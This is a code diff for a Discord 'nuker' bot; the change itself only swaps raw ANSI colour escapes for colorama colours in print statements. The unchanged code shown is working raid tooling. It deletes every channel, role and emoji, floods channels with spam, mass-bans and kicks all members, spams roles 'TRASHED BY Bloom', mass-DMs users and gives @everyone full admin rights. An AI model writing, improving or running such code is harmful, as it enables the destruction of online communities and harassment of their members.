@@ -42,24 +42,24 @@ async def nuke(ctx, amount=50):
   for channel in channels:
     try:
       await channel.delete()
-      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
+      print(Fore.GREEN +  f"{channel.name} Has Been Successfully Deleted!")
     except:
         pass
-        print ("\x1b[38;5;196mUnable To Delete Channel!")
+        print (Fore.RED + "Unable To Delete Channel!")
         guild = ctx.message.guild
   for i in range(amount):
     try:  
       await ctx.guild.create_text_channel(random.choice(channel_names))
-      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
+      print(Fore.GREEN + f"Successfully Made Channel [{i}]!")
     except:
-      print("\x1b[38;5;196mUnable To Create Channel!")
+      print(Fore.RED + "Unable To Create Channel!")
   for role in ctx.guild.roles:
     try:
       await role.delete()
-      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")
+      print(Fore.GREEN + f"{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")
 
     except:
-      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
+      print(Fore.RED + f"{role.name} Is Unable To Be Deleted")
   await asyncio.sleep(2)
   for i in range(100):  
     for i in range(1000):
@@ -67,15 +67,15 @@ async def nuke(ctx, amount=50):
         try:
           await channel.send(random.choice(message_spam)
         )
-          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
+          print(Fore.GREEN + f"{channel.name} Has Been Pinged!")
         except:
-          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
+          print(Fore.RED + f"Unable To Ping {channel.name}!")
     for member in list (ctx.guild.members):
         try:
           await member.ban(reason="Bloom owns yall")#change this if u want
-          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
+          print(Fore.GREEN + f"{member.name} Has Been Successfully Banned In {ctx.guild.name}")
         except:
-          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
+          print(Fore.RED + f"Unable To Ban {member.name} In {ctx.guild.name}!")
           
 
 @client.event
@@ -101,9 +101,9 @@ async def banall(ctx):
      for user in list(ctx.guild.members):
        try:
          await ctx.guild.ban(user)
-         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
+         print (Fore.GREEN + f"{member.name} Has Been Successfully Banned In {ctx.guild.name}")
        except:
-         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
+         print(Fore.RED + f"Unable To Ban {member.name} In {ctx.guild.name}!")
   
 
 
@@ -113,9 +113,9 @@ async def kickall(ctx):
   for member in ctx.guild.members:
     try:
       await member.kick(reason="llllll")
-      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
+      print(Fore.GREEN + f"{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
     except:
-      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")
+      print(Fore.RED + f"Unable To Kick {member.name} In {ctx.guild.name}!")
 
 
 @client.command()
@@ -124,9 +124,9 @@ async def rolespam(ctx):
   for i in range(1, 250):
     try:
       await ctx.guild.create_role(name=f"TRASHED BY Bloom")
-      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
+      print(Fore.GREEN + f"Successfully Created Role In {ctx.guild.name}!")
     except:
-      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")
+      print(Fore.RED + f"Unable To Create Roles In {ctx.guild.name}!")
 
 
 @client.command(pass_context=True)
@@ -135,9 +135,9 @@ async def emojidel(ctx):
  for emoji in list(ctx.guild.emojis):
             try:
                 await emoji.delete()
-                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
+                print (Fore.GREEN + f"Successfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
             except:
-                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")
+                print (Fore.RED + f"Unable To Delete Emoji {emoji.name} In {ctx.guild.name}!")
 
 
 @client.command()
@@ -146,9 +146,9 @@ async def dm(ctx, *, message:str):
   for user in list(ctx.guild.members):
     try:
       await user.send(message)
-      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
+      print(Fore.GREEN + f"DMed All Members In {ctx.guild.name}!")
     except:
-      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")
+      print(Fore.RED + f"Unable To DM Members In {ctx.guild.name}!")
 
 
 @client.command(pass_context=True)
@@ -158,9 +158,9 @@ async def admin(ctx):
              if role.name == '@everyone':
                   try:
                       await role.edit(permissions=Permissions.all())
-                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
+                      print(Fore.GREEN + f"Gave @everyone Admin In {ctx.guild.name}!") 
                   except:
-                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")
+                      print(Fore.RED + f"Unable To Give @everyone Admin In {ctx.guild.name}!")
 
 
 @client.command()
